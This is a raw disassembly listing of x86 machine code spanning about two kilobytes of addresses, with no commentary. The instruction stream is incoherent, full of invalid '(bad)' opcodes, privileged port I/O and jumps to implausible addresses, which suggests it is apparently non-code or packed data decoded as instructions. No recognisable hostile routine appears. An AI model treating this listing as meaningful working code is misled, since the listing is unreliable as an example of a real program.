  4203b6:	jl     0x420361
  4203b8:	imul   ebp,edi,0x173f17ca
  4203be:	out    dx,eax
  4203bf:	jae    0x420427
  4203c1:	rcl    DWORD PTR [ebp-0x4f],cl
  4203c4:	dec    ecx
  4203c5:	mov    bh,BYTE PTR [ecx+0x60017712]
  4203cb:	in     eax,dx
  4203cc:	fnstsw WORD PTR [edi]
  4203ce:	ror    BYTE PTR [esi],0x9c
  4203d1:	and    DWORD PTR cs:[eax-0x15],eax
  4203d5:	dec    ebp
  4203d6:	imul   edx,DWORD PTR [edx+esi*8+0x596d809],0xaa6bfba4
  4203e1:	stos   BYTE PTR es:[edi],al
  4203e2:	mov    bl,0xc7
  4203e4:	fisubr DWORD PTR [ecx-0x1c4a0928]
  4203ea:	xor    al,0x82
  4203ec:	dec    esp
  4203ed:	push   esp
  4203ee:	jle    0x42045d
  4203f0:	popa   
  4203f1:	and    eax,0x3619f640
  4203f6:	mov    es,esi
  4203f8:	xor    DWORD PTR [esi+ecx*4+0x27],ebp
  4203fc:	xchg   esp,eax
  4203fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4203fe:	xchg   DWORD PTR [ebx],eax
  420400:	xchg   esi,eax
  420401:	outs   dx,DWORD PTR ds:[esi]
  420402:	mov    esi,0xef960e8c
  420407:	jle    0x42040d
  420409:	ret    0x19af
  42040c:	shl    DWORD PTR [esi],0x7c
  42040f:	dec    esp
  420410:	mov    ds:0x635476c4,al
  420415:	not    DWORD PTR [esi+0x455ba2b]
  42041b:	jge    0x4203c5
  42041d:	jmp    0x7e9f3227
  420422:	add    ah,ah
  420424:	not    DWORD PTR [ebp-0x53335c65]
  42042a:	mov    ecx,0x9c4df07
  42042f:	adc    al,0x91
  420431:	ret    
  420432:	mov    ebx,0x5e23e6f7
  420437:	mov    esp,0x7c5fb6a1
  42043c:	push   ebx
  42043d:	sbb    BYTE PTR [edi],dl
  42043f:	jo     0x4203cb
  420441:	pop    ds
  420442:	push   es
  420443:	pop    ss
  420444:	daa    
  420445:	push   edx
  420446:	outs   dx,DWORD PTR ds:[esi]
  420447:	(bad)  
  420448:	std    
  420449:	test   eax,0x8b803235
  42044e:	push   ss
  42044f:	push   0xffffffc3
  420451:	pop    ebp
  420452:	(bad)  
  420453:	test   al,0x4a
  420455:	add    eax,0x92845ac2
  42045a:	xchg   DWORD PTR [esi+0x19],edi
  42045d:	daa    
  42045e:	aaa    
  42045f:	test   DWORD PTR [ebp+0x73e43262],edx
  420465:	ja     0x42045b
  420467:	xor    esp,DWORD PTR [edx]
  420469:	icebp  
  42046a:	mov    ds:0x458eb1ce,al
  42046f:	je     0x420413
  420471:	xchg   esi,eax
  420472:	dec    ecx
  420473:	add    al,BYTE PTR [ebx-0x14]
  420476:	xor    ebp,DWORD PTR [ebp+0x65]
  420479:	in     al,0x3e
  42047b:	add    cl,BYTE PTR [ebp+0x29]
  42047e:	add    BYTE PTR [ebx],ch
  420480:	ret    
  420481:	add    edx,DWORD PTR [edx-0x1f]
  420484:	mov    ch,0x99
  420486:	or     al,0x75
  420488:	or     dh,BYTE PTR [esi-0x6b]
  42048b:	jae    0x4204ff
  42048d:	add    eax,esi
  42048f:	lock pusha 
  420491:	push   ebx
  420492:	dec    eax
  420493:	retf   
  420494:	lock cmp al,0x27
  420497:	adc    al,0xce
  420499:	out    0x84,al
  42049b:	add    eax,0x8f1c7d9a
  4204a0:	cmp    BYTE PTR [edi-0x17],dh
  4204a3:	sub    ch,ch
  4204a5:	add    ebx,DWORD PTR [edx]
  4204a7:	sub    eax,0x4f823a6c
  4204ac:	popf   
  4204ad:	cmp    eax,0x961b6859
  4204b2:	loope  0x420500
  4204b4:	scas   al,BYTE PTR es:[edi]
  4204b5:	out    dx,eax
  4204b6:	xor    BYTE PTR [ebx],cl
  4204b8:	xchg   ebp,eax
  4204b9:	jae    0x4204ae
  4204bb:	gs jns 0x4204a4
  4204be:	(bad)
  4204c1:	or     al,0xa2
  4204c3:	push   ss
  4204c4:	add    eax,0xf9d599c0
  4204c9:	pusha  
  4204ca:	and    ebp,DWORD PTR [ebx]
  4204cc:	ins    DWORD PTR es:[edi],dx
  4204cd:	jno    0x420515
  4204cf:	ror    DWORD PTR [ebp-0x69aa0f54],0x21
  4204d6:	adc    bh,BYTE PTR [ebp+0x5e4dde92]
  4204dc:	test   al,0x3a
  4204de:	ins    DWORD PTR es:[edi],dx
  4204df:	(bad)  
  4204e1:	add    bh,BYTE PTR [edi+ecx*8]
  4204e4:	mov    ecx,DWORD PTR [eax+0x48]
  4204e7:	stos   DWORD PTR es:[edi],eax
  4204e8:	das    
  4204e9:	retf   
  4204ea:	xor    eax,0xb07c7ebc
  4204ef:	jae    0x42052c
  4204f1:	sbb    eax,0x3439cc4f
  4204f6:	pusha  
  4204f7:	jae    0x42055b
  4204f9:	iret   
  4204fa:	shl    BYTE PTR [esi-0x63b460f6],cl
  420500:	(bad)  
  420502:	mov    ecx,0x31029621
  420507:	mov    DWORD PTR [eax-0x2b092af8],ecx
  42050d:	jne    0x4204ed
  42050f:	pop    esi
  420510:	jmp    0x69a91b92
  420515:	and    dl,bl
  420517:	loope  0x4204ac
  420519:	enter  0x42ef,0x77
  42051d:	loop   0x4204e9
  42051f:	aad    0xd0
  420521:	fwait
  420522:	(bad)  
  420523:	enter  0x22d4,0x41
  420527:	int3   
  420528:	mov    edx,0xf699a8b2
  42052d:	mov    DWORD PTR [ebx+ecx*1-0x376dfb51],0xe48a911
  420538:	in     eax,0x3b
  42053a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42053b:	repz add al,BYTE PTR [ebp-0x5c8b6f93]
  420542:	pop    edi
  420543:	fs mov ch,0x0
  420546:	and    eax,0x89100dcc
  42054b:	dec    ebx
  42054c:	add    al,BYTE PTR [eax+0x7c985530]
  420552:	dec    esp
  420553:	fdiv   st(1),st
  420555:	mov    bh,BYTE PTR ds:0x349a74da
  42055b:	pop    esi
  42055c:	push   edx
  42055d:	adc    ecx,DWORD PTR [edi-0x49]
  420560:	popf   
  420561:	mov    DWORD PTR [ebp+0x56],ecx
  420564:	fxch   st(5)
  420566:	sbb    cl,BYTE PTR [edi+eax*1]
  420569:	mov    dl,0x2
  42056b:	pop    ss
  42056c:	test   BYTE PTR [edi-0x757ec330],bl
  420572:	push   0xffffffc0
  420574:	(bad)  
  420575:	hlt    
  420576:	xor    edx,edi
  420578:	in     eax,dx
  420579:	mov    dl,0x5a
  42057b:	inc    ebp
  42057c:	fcmovnu st,st(7)
  42057e:	lods   al,BYTE PTR ds:[esi]
  42057f:	les    ebp,FWORD PTR [esp+ecx*2]
  420582:	push   ebx
  420583:	mov    ebp,0xc3a714be
  420588:	add    DWORD PTR [ebx+0xa],edi
  42058b:	sahf   
  42058c:	mov    ds:0x222511a3,al
  420591:	push   es
  420592:	jl     0x420604
  420594:	inc    edi
  420595:	jb     0x4205b1
  420597:	push   ss
  420598:	sub    BYTE PTR [eax+edx*1],bl
  42059b:	les    ecx,FWORD PTR [edi]
  42059d:	xchg   BYTE PTR [ebp-0x64],bl
  4205a0:	jmp    0xcf6b:0x6afbe3e7
  4205a7:	mov    al,ds:0xd00bff37
  4205ac:	push   ebp
  4205ad:	add    eax,0x73e43598
  4205b2:	push   ds
  4205b3:	mov    DWORD PTR [edi-0x2997bf75],edi
  4205b9:	repz add eax,0x24bd3aa2
  4205bf:	in     eax,0xc3
  4205c1:	hlt    
  4205c2:	dec    edi
  4205c3:	jp     0x420606
  4205c5:	fwait
  4205c6:	xor    eax,0x17a9a996
  4205cb:	in     eax,dx
  4205cc:	add    DWORD PTR [ebp-0x4df6011a],eax
  4205d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4205d3:	inc    DWORD PTR [esi]
  4205d5:	rcl    BYTE PTR [ebp-0x2c],cl
  4205d8:	pop    edi
  4205d9:	xchg   esi,eax
  4205da:	sub    eax,0xefa34466
  4205df:	mov    al,0xea
  4205e1:	(bad)
  4205e4:	cmp    BYTE PTR [edi+esi*4],0xcd
  4205e8:	loop   0x420609
  4205ea:	cmp    BYTE PTR [ebx+0x55090a16],0xb1
  4205f1:	fidiv  DWORD PTR [ecx-0x70]
  4205f4:	adc    BYTE PTR [edi+0x4b90aa5f],ah
  4205fa:	jae    0x4205af
  4205fc:	mov    al,0xbf
  4205fe:	pushw  cs
  420600:	inc    ebp
  420601:	add    al,0x9d
  420603:	xor    DWORD PTR [esi],ecx
  420605:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420606:	xchg   edx,eax
  420607:	and    al,0xb8
  420609:	xchg   DWORD PTR [ebp+0x51],ecx
  42060c:	imul   eax,DWORD PTR [esi],0x51593b9b
  420612:	jge    0x420612
  420614:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420615:	mov    al,0xd0
  420617:	mov    esp,es
  420619:	sbb    esi,DWORD PTR [edx-0x3831ac56]
  42061f:	sub    DWORD PTR [ecx-0x53],0x48e3703e
  420626:	scas   al,BYTE PTR es:[edi]
  420627:	sti    
  420628:	push   ds
  420629:	and    esi,eax
  42062b:	xchg   ecx,eax
  42062c:	rcr    DWORD PTR [ecx-0x44],cl
  42062f:	les    esp,FWORD PTR [edx]
  420631:	mov    esi,0x35889798
  420636:	or     eax,edi
  420638:	pusha  
  420639:	repnz dec edi
  42063b:	push   eax
  42063c:	enter  0x695e,0xf0
  420640:	xlat   BYTE PTR ds:[ebx]
  420641:	das    
  420642:	hlt    
  420643:	test   BYTE PTR [edi+0x51],ah
  420646:	gs int 0xcf
  420649:	mov    edx,DWORD PTR [eiz*1+0x2d3220b0]
  420650:	pop    ebx
  420651:	js     0x4205f8
  420653:	(bad)  
  420654:	mov    bl,0xda
  420656:	aas    
  420657:	inc    edx
  420658:	(bad)  
  420659:	push   0x6d
  42065b:	push   eax
  42065c:	lea    eax,[eax+edi*8-0x5ff8d268]
  420663:	sahf   
  420664:	pop    ecx
  420665:	dec    ebp
  420666:	inc    ebp
  420667:	comiss xmm6,DWORD PTR [esi]
  42066a:	gs inc edi
  42066c:	nop
  42066d:	add    dl,bl
  42066f:	sbb    esi,DWORD PTR [edi]
  420671:	mov    ch,0xb2
  420673:	mov    al,ds:0xa7e2c168
  420678:	push   edx
  420679:	jmp    0x4206a8
  42067b:	push   ebx
  42067c:	in     eax,0x2
  42067e:	nop
  42067f:	aaa    
  420680:	jmp    0xaa6bd1c6
  420685:	test   al,0x5d
  420687:	idiv   dl
  420689:	pop    ss
  42068a:	popaw  
  42068c:	jmp    0x5ec0e63e
  420691:	jno    0x420705
  420693:	mov    BYTE PTR [esi],0x7c
  420696:	lea    edx,[edi+0x7eb16532]
  42069c:	enter  0x7e9d,0x44
  4206a0:	dec    DWORD PTR [ecx+0x14]
  4206a3:	iret   
  4206a4:	push   ebx
  4206a5:	add    eax,0xd50bd6b8
  4206aa:	ja     0x42070f
  4206ac:	iret   
  4206ad:	jmp    0x9bdd7e31
  4206b2:	aaa    
  4206b3:	push   eax
  4206b4:	into   
  4206b5:	loop   0x420646
  4206b7:	aas    
  4206b8:	mov    ah,0x23
  4206ba:	pop    eax
  4206bb:	xchg   edi,eax
  4206bc:	(bad)  
  4206bd:	dec    ecx
  4206be:	lods   eax,DWORD PTR ds:[esi]
  4206bf:	mov    dl,0x2a
  4206c1:	sub    al,0x43
  4206c3:	(bad)  [ecx]
  4206c5:	lods   al,BYTE PTR ds:[esi]
  4206c6:	push   esp
  4206c7:	xchg   edx,eax
  4206c8:	pop    edx
  4206c9:	push   0x75a4a365
  4206ce:	push   0xe4ec8ffa
  4206d3:	cmp    bh,bl
  4206d5:	xor    ah,ah
  4206d7:	retf   0x7205
  4206da:	mov    DWORD PTR [esi-0x37],eax
  4206dd:	adc    BYTE PTR [edi],al
  4206df:	mov    esi,0xfa79d553
  4206e4:	ja     0x4206ce
  4206e6:	push   ss
  4206e7:	jae    0x4206f8
  4206e9:	stos   BYTE PTR es:[edi],al
  4206ea:	in     al,dx
  4206eb:	in     al,0xe4
  4206ed:	dec    ecx
  4206ee:	xchg   esp,eax
  4206ef:	jg     0x420679
  4206f1:	out    dx,al
  4206f2:	ret    
  4206f3:	jnp    0x42071a
  4206f5:	fbld   TBYTE PTR [edx+0x67b9fa9a]
  4206fb:	jmp    0x4206e4
  4206fd:	or     DWORD PTR [ebx+0x1b233568],edx
  420703:	out    dx,al
  420704:	les    esp,FWORD PTR [edx]
  420706:	retf   
  420707:	xor    BYTE PTR [edi+0x7c],bl
  42070a:	(bad)  
  42070b:	aad    0xb3
  42070d:	icebp  
  42070e:	cmp    bl,dl
  420710:	(bad)  
  420711:	loopne 0x420773
  420713:	xor    BYTE PTR [edx],dh
  420715:	cli    
  420716:	push   eax
  420717:	jno    0x42069d
  420719:	lods   eax,DWORD PTR ds:[esi]
  42071a:	xor    BYTE PTR [eax+0xc1d1f17],ch
  420720:	retf   0xdc22
  420723:	in     al,0x0
  420725:	bound  esp,QWORD PTR [ecx+0xf]
  420728:	out    dx,al
  420729:	add    DWORD PTR [ebx+0x26a09784],eax
  42072f:	and    eax,0x51e1fc8b
  420734:	pop    ecx
  420735:	popa   
  420736:	dec    esi
  420737:	jp     0x4207ab
  420739:	(bad)  
  42073a:	div    BYTE PTR [esp+ecx*4]
  42073d:	bound  edx,QWORD PTR [edi-0x20dbcba2]
  420743:	pop    ebx
  420744:	ja     0x42073c
  420746:	mov    BYTE PTR [esi],al
  420748:	call   0xd582:0x37aefe17
  42074f:	sar    DWORD PTR [edi+0xd],cl
  420752:	shl    BYTE PTR [ecx],0x10
  420755:	mov    DWORD PTR [eax],edx
  420757:	dec    ebp
  420758:	test   al,0x6f
  42075a:	and    al,0x3f
  42075c:	mov    al,ds:0xbe848603
  420761:	div    ah
  420763:	or     al,0x13
  420765:	dec    ebp
  420766:	adc    eax,ecx
  420768:	sub    eax,0xd44ed09a
  42076d:	fnstenv [eax]
  42076f:	xor    bh,dh
  420771:	xor    bl,bh
  420773:	scas   eax,DWORD PTR es:[edi]
  420774:	dec    eax
  420775:	bound  ebp,QWORD PTR [ebx-0x58]
  420778:	imul   edi,DWORD PTR [ebp-0x6f],0xf216f887
  42077f:	cwde   
  420780:	inc    ebp
  420781:	adc    cl,bl
  420783:	sbb    bl,BYTE PTR [eax-0x40c93b61]
  420789:	repz xlat BYTE PTR ds:[ebx]
  42078b:	ins    DWORD PTR es:[edi],dx
  42078c:	sub    BYTE PTR [ebx-0x2120ee96],0x34
  420793:	loope  0x4207cd
  420795:	sbb    ebx,ecx
  420797:	push   cs
  420798:	clc    
  420799:	rcpps  xmm2,XMMWORD PTR [esi]
  42079c:	shl    BYTE PTR [eax+ebp*1-0x51],0x5
  4207a1:	dec    eax
  4207a2:	or     DWORD PTR [esi+eiz*1+0x7b],eax
  4207a6:	mov    edi,0xcb0a0f0b
  4207ab:	push   ss
  4207ac:	or     eax,0xe29ef040
  4207b1:	ins    BYTE PTR es:[edi],dx
  4207b2:	test   esp,0x1f2170fa
  4207b8:	mov    ds:0xfc496de6,al
  4207bd:	pop    ds
  4207be:	push   esi
  4207bf:	shl    DWORD PTR [edx+0x72b5a94e],1
  4207c5:	sbb    BYTE PTR [esi-0x63],ch
  4207c8:	ins    DWORD PTR es:[edi],dx
  4207c9:	xor    eax,0x57be9acd
  4207ce:	mov    ebp,0xb0ebb7a7
  4207d3:	retf   
  4207d4:	jg     0x420781
  4207d6:	inc    ebx
  4207d7:	adc    eax,0x582f2f03
  4207dc:	push   ebx
  4207dd:	xchg   edx,eax
  4207de:	push   0xb
  4207e0:	xor    dl,BYTE PTR [edx-0x5b]
  4207e3:	xor    al,0x5d
  4207e5:	xor    DWORD PTR [eax+0x48682712],eax
  4207eb:	sbb    BYTE PTR [eax+0x4b],dh
  4207ee:	cmp    eax,0xf21ebbdf
  4207f3:	lods   eax,DWORD PTR ds:[esi]
  4207f4:	cwde   
  4207f5:	push   edx
  4207f6:	mov    DWORD PTR [eax-0x150d6e7e],eax
  4207fc:	push   0xffffffa6
  4207fe:	xor    dh,ch
  420800:	(bad)  
  420801:	mov    bl,0x7b
  420803:	push   ds
  420804:	mov    esp,0x91efd4e2
  420809:	push   esp
  42080a:	lahf   
  42080b:	mov    dh,0xa9
  42080d:	clc    
  42080e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42080f:	dec    ecx
  420810:	sbb    eax,DWORD PTR [edi-0x10]
  420813:	aaa    
  420814:	pop    esi
  420815:	xchg   DWORD PTR [edx+0x3074e9db],esi
  42081b:	mov    ds:0x31a9a366,eax
  420820:	mov    esp,0xc34dd145
  420825:	push   ebp
  420826:	fwait
  420827:	mov    ds:0x13ab26cb,eax
  42082c:	(bad)  
  42082d:	jecxz  0x4207be
  42082f:	fcom   DWORD PTR [edi-0x2d]
  420832:	popf   
  420833:	or     DWORD PTR [ecx+0x1cb56031],0xfffffff5
  42083a:	outs   dx,DWORD PTR ds:[esi]
  42083b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42083c:	pop    ebp
  42083d:	aas    
  42083e:	js     0x4207d7
  420840:	js     0x420815
  420842:	pushf  
  420843:	enter  0xf1e1,0x92
  420847:	sub    al,0xfd
  420849:	nop
  42084a:	mov    ah,0x69
  42084c:	mov    esp,0xb070c35a
  420851:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420852:	push   ds
  420853:	(bad)  
  420854:	and    BYTE PTR [ecx+0x60],cl
  420857:	jb     0x4208d3
  420859:	mov    ebx,0xf10d8e13
  42085e:	sub    BYTE PTR [eax+esi*8-0x6c28cb52],bl
  420865:	and    cl,cl
  420867:	sub    al,0x47
  420869:	adc    al,0xdb
  42086b:	jae    0x42089e
  42086d:	and    al,0x34
  42086f:	pop    es
  420870:	loopne 0x420841
  420872:	jnp    0x420842
  420874:	sahf   
  420875:	xchg   edi,eax
  420876:	mov    eax,0x8c9f5af2
  42087b:	push   ds
  42087c:	in     al,dx
  42087d:	jle    0x42087c
  42087f:	push   edi
  420880:	mov    ecx,0x58f03eef
  420885:	cmp    dl,BYTE PTR [edx-0x23]
  420888:	pop    eax
  420889:	leave  
  42088a:	lea    eax,[edx+0x5a3660d6]
  420890:	or     DWORD PTR es:[edx+0x0],0xf76f2280
  420898:	push   ebx
  420899:	mov    fs,WORD PTR [edi+0x73b0f935]
  42089f:	(bad)  [eax+0x49]
  4208a2:	add    al,BYTE PTR [esi]
  4208a4:	cli    
  4208a5:	xchg   ebp,eax
  4208a6:	xchg   esi,eax
  4208a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4208a8:	jl     0x42082a
  4208aa:	cmp    DWORD PTR [edx-0x7ab8885d],ebx
  4208b0:	and    dh,BYTE PTR [esp+esi*4-0x7b]
  4208b4:	imul   esi,DWORD PTR [ebp-0x19cef703],0xffffff8a
  4208bb:	adc    dl,BYTE PTR [esi+0xa7651a7]
  4208c1:	or     DWORD PTR [esi-0x6001e685],esp
  4208c7:	lahf   
  4208c8:	loopne 0x4208f9
  4208ca:	cs (bad) 
  4208cc:	clc    
  4208cd:	stos   DWORD PTR es:[edi],eax
  4208ce:	call   0x3058af0f
  4208d3:	(bad)  
  4208d4:	push   0x15
  4208d6:	dec    edx
  4208d7:	push   ds
  4208d8:	je     0x42087d
  4208da:	or     BYTE PTR [ecx],ah
  4208dc:	retf   
  4208dd:	mov    ch,0x20
  4208df:	scas   eax,DWORD PTR es:[edi]
  4208e0:	mov    al,0x4f
  4208e2:	(bad)  
  4208e3:	test   eax,0xfcfe01e1
  4208e8:	add    ch,bl
  4208ea:	scas   al,BYTE PTR es:[edi]
  4208eb:	movq   mm6,QWORD PTR ds:0xb17613e3
  4208f2:	sbb    BYTE PTR [ebx-0x7],cl
  4208f5:	cmp    ebx,eax
  4208f7:	mov    ecx,0xf1c464d
  4208fc:	dec    esi
  4208fd:	fs cs into 
  420900:	xor    ebp,ecx
  420902:	jo     0x420889
  420904:	ret    0x209c
  420907:	sahf   
  420908:	jae    0x420949
  42090a:	gs dec esi
  42090c:	jo     0x4208be
  42090e:	mov    ds:0x64581aca,eax
  420913:	push   ss
  420914:	push   edx
  420915:	cdq    
  420916:	mov    al,0xe4
  420918:	imul   edi,DWORD PTR [ecx-0x2b],0xffffffac
  42091c:	fs pop es
  42091e:	mov    ebp,0xad213a39
  420923:	cli    
  420924:	and    dl,dl
  420926:	adc    al,0x16
  420928:	inc    edx
  420929:	cdq    
  42092a:	inc    esi
  42092b:	stos   DWORD PTR es:[edi],eax
  42092c:	outs   dx,DWORD PTR ds:[esi]
  42092d:	jb     0x420911
  42092f:	and    al,0x5b
  420931:	(bad)  
  420933:	(bad)  
  420934:	and    al,0x4b
  420936:	mov    cl,0xa7
  420938:	retf   0xf63b
  42093b:	push   es
  42093c:	jno    0x42098f
  42093e:	pushf  
  42093f:	pop    edi
  420940:	jo     0x4208d8
  420942:	ins    BYTE PTR es:[edi],dx
  420943:	mov    edi,0x88ea9bea
  420948:	add    eax,0x30df2236
  42094d:	mov    bh,0xdf
  42094f:	or     cl,BYTE PTR [esi-0x4d]
  420952:	xchg   esp,eax
  420953:	jmp    0x42099d
  420955:	pop    ebx
  420956:	ins    BYTE PTR es:[edi],dx
  420957:	in     al,0xb9
  420959:	xchg   BYTE PTR [eax-0x641413bb],al
  42095f:	lods   al,BYTE PTR ds:[esi]
  420960:	xor    dh,0xa3
  420963:	pushf  
  420964:	xor    eax,DWORD PTR [ebp-0x755e22b1]
  42096a:	fisttp QWORD PTR [ebp+0xbf890f1]
  420970:	(bad)  
  420971:	mov    ah,0xd9
  420973:	push   ss
  420974:	jnp    0x4209a6
  420976:	int3   
  420977:	mov    WORD PTR [eax+edi*2],es
  42097a:	neg    DWORD PTR [ebp-0x68aa84cc]
  420980:	xor    al,0xcd
  420982:	ret    0xf90a
  420985:	sbb    BYTE PTR [ebx],bh
  420987:	out    0xaf,eax
  420989:	pushf  
  42098a:	ds loope 0x42093d
  42098d:	call   0xe08a:0xc1f7ed3f
  420994:	pop    ss
  420995:	push   es
  420996:	xor    BYTE PTR [ebx+0x4be8a634],bh
  42099c:	dec    ecx
  42099d:	pop    ebp
  42099e:	imul   esi,DWORD PTR [esp+ecx*8],0xff32baa6
  4209a5:	cmp    al,0x1a
  4209a7:	cs mov ebp,0x36e61135
  4209ad:	pop    eax
  4209ae:	hlt    
  4209af:	and    bh,ch
  4209b1:	mov    ah,0x78
  4209b3:	add    BYTE PTR [edx+0x43],0x5
  4209b7:	xchg   ecx,eax
  4209b8:	int    0x92
  4209ba:	jp     0x4209d1
  4209bc:	cdq    
  4209bd:	push   0x6a05c6a6
  4209c2:	test   DWORD PTR [edx+0x4],ebx
  4209c5:	iret   
  4209c6:	mov    ebx,0xca6a9234
  4209cb:	outs   dx,BYTE PTR ds:[esi]
  4209cc:	scas   al,BYTE PTR es:[edi]
  4209cd:	xlat   BYTE PTR ds:[ebx]
  4209ce:	jle    0x4209b4
  4209d0:	(bad)  
  4209d1:	pop    ebp
  4209d2:	imul   ebx,DWORD PTR [edi+ebx*1+0x67],0x63
  4209d7:	xor    DWORD PTR [esi-0xf924e83],ecx
  4209dd:	pop    ds
  4209de:	or     al,0x1c
  4209e0:	fisttp DWORD PTR [ebx-0x2e]
  4209e3:	jle    0x4209cd
  4209e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4209e6:	dec    edx
  4209e7:	pop    eax
  4209e8:	daa    
  4209e9:	ds pushw 0xffd4
  4209ed:	push   ss
  4209ee:	inc    esp
  4209ef:	or     BYTE PTR [ecx],ch
  4209f1:	jge    0x42099a
  4209f3:	inc    ebp
  4209f4:	ins    DWORD PTR es:[edi],dx
  4209f5:	call   0x571d:0x9ab3cc8
  4209fc:	idiv   dl
  4209fe:	sub    BYTE PTR [eax],bh
  420a00:	mov    ah,0x3c
  420a02:	(bad)  
  420a03:	xchg   esp,eax
  420a04:	mov    ax,0x5c1d
  420a08:	adc    esi,DWORD PTR [edx]
  420a0a:	or     al,0xca
  420a0c:	iret   
  420a0d:	fwait
  420a0e:	icebp  
  420a0f:	in     al,0xf7
  420a11:	mov    ds,WORD PTR [edi]
  420a13:	in     eax,dx
  420a14:	aas    
  420a15:	xor    edx,edx
  420a17:	mov    edx,0x8a95681f
  420a1c:	jbe    0x4209b1
  420a1e:	or     edx,edx
  420a20:	call   0x75b93811
  420a25:	adc    ebp,ecx
  420a27:	outs   dx,DWORD PTR ds:[esi]
  420a28:	ins    DWORD PTR es:[edi],dx
  420a29:	mov    bl,0xac
  420a2b:	mov    edi,0xd7edbf56
  420a30:	fwait
  420a31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420a32:	out    0x7c,al
  420a34:	pop    ds
  420a35:	jp     0x420a79
  420a37:	sub    eax,0x24032b46
  420a3c:	sub    cl,BYTE PTR [edx-0x24fab6fe]
  420a42:	push   DWORD PTR [eax+0x35]
  420a45:	je     0x420ab7
  420a47:	test   eax,0x42562130
  420a4c:	mov    esi,0xef10c787
  420a51:	adc    al,0x90
  420a53:	les    esp,FWORD PTR [eax+0x20]
  420a56:	add    cl,BYTE PTR [ebp+esi*8+0x4e]
  420a5a:	mov    al,ah
  420a5c:	dec    ebx
  420a5d:	cli    
  420a5e:	push   0xe8db3404
  420a63:	scas   al,BYTE PTR es:[edi]
  420a64:	jecxz  0x420a8c
  420a66:	adc    BYTE PTR [edx+0x53c9a060],0x66
  420a6d:	(bad)  
  420a6e:	cmc    
  420a6f:	lar    edi,WORD PTR [edi+0x34]
  420a73:	stos   BYTE PTR es:[edi],al
  420a74:	mov    WORD PTR [esi-0x156d21de],ds
  420a7a:	mov    bh,0x3
  420a7c:	(bad)  
  420a7d:	adc    eax,ebx
  420a7f:	rcr    DWORD PTR ds:0x92756c,cl
  420a85:	sub    al,0x56
  420a87:	ds js  0x420b00
  420a8a:	test   al,0x81
  420a8c:	push   edi
  420a8d:	add    DWORD PTR fs:[ebp-0x72db7bd5],esp
  420a94:	jp     0x420acc
  420a96:	aas    
  420a97:	cmp    eax,0x7f616d0
  420a9c:	mov    ds:0xb2072ea,eax
  420aa1:	pop    eax
  420aa2:	scas   eax,DWORD PTR es:[edi]
  420aa3:	adc    BYTE PTR [ebp+0x1718e707],bl
  420aa9:	ret    
  420aaa:	(bad)
  420aad:	aam    0xd3
  420aaf:	adc    al,0x5e
  420ab1:	lahf   
  420ab2:	cld    
  420ab3:	not    al
  420ab5:	lea    ecx,ds:0xfc5acbc6
  420abb:	fwait
  420abc:	shr    ebx,cl
  420abe:	adc    al,0x92
  420ac0:	xor    eax,0xbd5f14ae
  420ac5:	mov    DWORD PTR [ebx],esp
  420ac7:	or     al,0x66
  420ac9:	sahf   
  420aca:	pop    esi
  420acb:	fs push ecx
  420acd:	sbb    edi,edi
  420acf:	add    DWORD PTR [esi],ecx
  420ad1:	xor    BYTE PTR [ecx+0x6e93d37f],ch
  420ad7:	lock daa 
  420ad9:	iret   
  420ada:	shr    DWORD PTR [ecx],cl
  420adc:	out    0x8,eax
  420ade:	xor    esp,DWORD PTR [eax]
  420ae0:	mov    eax,ebp
  420ae2:	push   ss
  420ae3:	adc    BYTE PTR [ebp+0x56d4f2a4],dl
  420ae9:	xor    BYTE PTR [eax+esi*4+0x15],bh
  420aed:	loopne 0x420ad9
  420aef:	mov    bh,0x67
  420af1:	stc    
  420af2:	mov    al,ds:0x2686d23a
  420af7:	aam    0xc1
  420af9:	shl    esi,1
  420afb:	test   al,0x74
  420afd:	adc    al,0x66
  420aff:	jg     0x420a9e
  420b01:	je     0x420a8a
  420b03:	cmp    esp,DWORD PTR [eax]
  420b05:	rcl    BYTE PTR [edi],1
  420b07:	sbb    BYTE PTR [edi+0x1d],0x78
  420b0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420b0c:	jle    0x420aa4
  420b0e:	or     al,BYTE PTR [esi-0x74]
  420b11:	ins    DWORD PTR es:[edi],dx
  420b12:	mov    eax,0x6111670b
  420b17:	std    
  420b18:	iret   
  420b19:	xor    al,0xdb
  420b1b:	repz pop ebp
  420b1d:	loope  0x420b70
  420b1f:	xchg   esp,eax
  420b20:	or     eax,0xbb5b0046
  420b25:	shl    ebp,0x25
  420b28:	call   0x25ad6818
  420b2d:	pushf  
  420b2e:	test   al,0xf7
  420b30:	xor    al,0x9b
  420b32:	fs loope 0x420b8d
  420b35:	in     al,0x32
  420b37:	xor    BYTE PTR [edi-0x21],al
  420b3a:	leave  
  420b3b:	fdiv   st,st(6)
  420b3d:	mov    ebx,0x5f16c8c7
  420b42:	mov    ?,edx
  420b44:	enter  0xa7a2,0x67
  420b48:	pushf  
  420b49:	dec    edi
  420b4a:	aam    0x6d
  420b4c:	cwde   
  420b4d:	stc    
  420b4e:	mov    ecx,0xe3e10235
  420b53:	pop    esp
  420b54:	mov    esi,0x709c5bef
  420b59:	fwait
  420b5a:	js     0x420b65
  420b5c:	retf   0x23fe
  420b5f:	nop
  420b60:	(bad)  
  420b61:	scas   eax,DWORD PTR es:[edi]
  420b62:	dec    edx
  420b63:	dec    eax
  420b64:	mov    al,ds:0x6ead7d88
  420b69:	jl     0x420af4
  420b6b:	aam    0x89
  420b6d:	loope  0x420b43
  420b6f:	(bad)  
  420b70:	mov    ebx,0xcbdf4f2d
  420b75:	hlt    
  420b76:	inc    edx
  420b77:	or     BYTE PTR [ecx],al
  420b79:	push   0x6428116e
  420b7e:	and    bh,BYTE PTR [esi+0x7c]
  420b81:	add    edx,DWORD PTR [ebx+ebx*1-0x74e98f17]
  420b88:	xlat   BYTE PTR ds:[ebx]
  420b89:	popf   
  420b8a:	mov    ds:0x869ac5e6,eax
  420b8f:	je     0x420b84
